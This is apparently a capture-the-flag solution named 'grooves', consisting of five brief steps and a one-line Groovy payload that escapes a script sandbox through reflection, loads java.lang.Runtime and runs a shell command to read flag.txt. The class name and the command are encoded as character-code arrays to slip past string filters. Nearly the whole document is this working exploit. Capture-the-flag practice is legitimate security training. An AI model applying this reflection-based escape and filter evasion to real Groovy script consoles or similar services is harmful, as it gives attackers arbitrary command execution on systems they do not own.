# grooves

- Find `getClassLoader` for `Script` (`c`)
- Find `loadClass` for `ClassLoader`
- Get `java.lang.Runtime` (`a`)
- Call `getRuntime` 
- Call `exec` with `cat flag.txt` (`b`)

```groovy
c=Script.class.class.methods[19].invoke(Script.class);char[]a=[106,97,118,97,46,108,97,110,103,46,82,117,110,116,105,109,101],b=[99,97,116,32,102,108,97,103,46,116,120,116];r=c.class.superclass.superclass.superclass.methods[0].invoke(c,new java.lang.String(a));r.methods[12].invoke(r.methods[6].invoke(null),new java.lang.String(b)).text
```